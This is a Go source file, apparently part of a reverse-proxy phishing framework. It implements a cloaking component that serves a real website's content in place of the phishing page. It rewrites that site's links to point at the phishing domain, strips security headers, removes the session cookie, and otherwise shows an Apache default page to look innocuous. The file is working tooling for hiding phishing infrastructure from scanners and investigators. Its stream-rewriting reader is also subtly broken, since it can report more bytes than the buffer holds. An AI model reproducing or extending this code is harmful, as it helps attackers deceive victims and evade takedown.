package proxy

import (
	"bytes"
	_ "embed"
	"io"
	"log/slog"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"
)

//go:embed spoof_default.html
var spoofDefaultPage []byte

// SpoofSite renders a legitimate site's content in place of a phishing
// response, making the server appear to host real content. It rewrites
// domain references in the response body so the spoofed site's links
// point to the phishing domain, strips security headers, and removes
// the session tracking cookie.
//
// When no spoof URL is configured, ServeHTTP serves the Apache default page —
// a 200 OK response that makes the server look like an ordinary unconfigured
// web host rather than returning a suspicious empty error response.
type SpoofSite struct {
	defaultSpoofURL string
	logger          *slog.Logger
	transport       *http.Transport
}

func NewSpoofSite(defaultSpoofURL string, logger *slog.Logger) *SpoofSite {
	return &SpoofSite{
		defaultSpoofURL: defaultSpoofURL,
		logger:          logger,
		transport: &http.Transport{
			ResponseHeaderTimeout: 10 * time.Second,
			IdleConnTimeout:       30 * time.Second,
		},
	}
}

// ServeHTTP spoofs using the default spoof URL, or the Apache default page if none is configured.
func (s *SpoofSite) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	s.ServeWithTarget(w, r, "")
}

// ServeWithTarget spoofs using the provided URL, falling back to the default
// spoof URL, and finally to the Apache default page if neither is available.
func (s *SpoofSite) ServeWithTarget(w http.ResponseWriter, r *http.Request, spoofURL string) {
	if spoofURL == "" {
		spoofURL = s.defaultSpoofURL
	}
	if spoofURL == "" {
		serveDefaultPage(w)
		return
	}

	target, err := url.Parse(spoofURL)
	if err != nil {
		s.logger.Error("spoof: invalid URL", "url", spoofURL, "error", err)
		serveDefaultPage(w)
		return
	}

	phishingHost := r.Host
	rp := &httputil.ReverseProxy{
		Rewrite: func(pr *httputil.ProxyRequest) {
			pr.SetURL(target)
			pr.Out.Host = target.Host

			if referer := pr.In.Header.Get("Referer"); referer != "" {
				pr.Out.Header.Set("Referer", rewriteSpoofHost(referer, target.Host))
			}
			// Remove session tracking cookie so the spoofed site starts fresh.
			stripSpoofCookie(pr.Out, SessionCookieName)
		},
		Transport: s.transport,
		ModifyResponse: func(resp *http.Response) error {
			for _, name := range headersToStrip {
				resp.Header.Del(name)
			}
			if isSpoofRewritable(resp.Header.Get("Content-Type")) {
				resp.Body = rewriteSpoofBody(resp.Body, target.Host, phishingHost)
			}
			return nil
		},
		ErrorHandler: func(w http.ResponseWriter, _ *http.Request, err error) {
			s.logger.Warn("spoof: upstream error", "url", spoofURL, "error", err)
			serveDefaultPage(w)
		},
	}

	rp.ServeHTTP(w, r)
}

func serveDefaultPage(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write(spoofDefaultPage)
}

func rewriteSpoofHost(rawURL, newHost string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	parsed.Host = newHost
	return parsed.String()
}

func stripSpoofCookie(r *http.Request, name string) {
	cookies := r.Cookies()
	r.Header.Del("Cookie")
	for _, cookie := range cookies {
		if cookie.Name != name {
			r.AddCookie(cookie)
		}
	}
}

func isSpoofRewritable(contentType string) bool {
	for _, rewritable := range []string{
		"text/html", "text/css", "text/javascript",
		"application/javascript", "application/json",
		"application/x-javascript", "image/svg+xml",
	} {
		if strings.HasPrefix(contentType, rewritable) {
			return true
		}
	}
	return false
}

// rewriteSpoofBody wraps a response body to replace occurrences of fromHost
// with toHost on the fly, so the spoofed site's links point to the phishing domain.
func rewriteSpoofBody(body io.ReadCloser, fromHost, toHost string) io.ReadCloser {
	return &spoofRewriteReader{
		r:    body,
		from: []byte(fromHost),
		to:   []byte(toHost),
	}
}

type spoofRewriteReader struct {
	r    io.ReadCloser
	from []byte
	to   []byte
}

func (rr *spoofRewriteReader) Read(p []byte) (int, error) {
	n, err := rr.r.Read(p)
	if n > 0 {
		replaced := bytes.ReplaceAll(p[:n], rr.from, rr.to)
		copy(p, replaced)
		return len(replaced), err
	}
	return n, err
}

func (rr *spoofRewriteReader) Close() error { return rr.r.Close() }
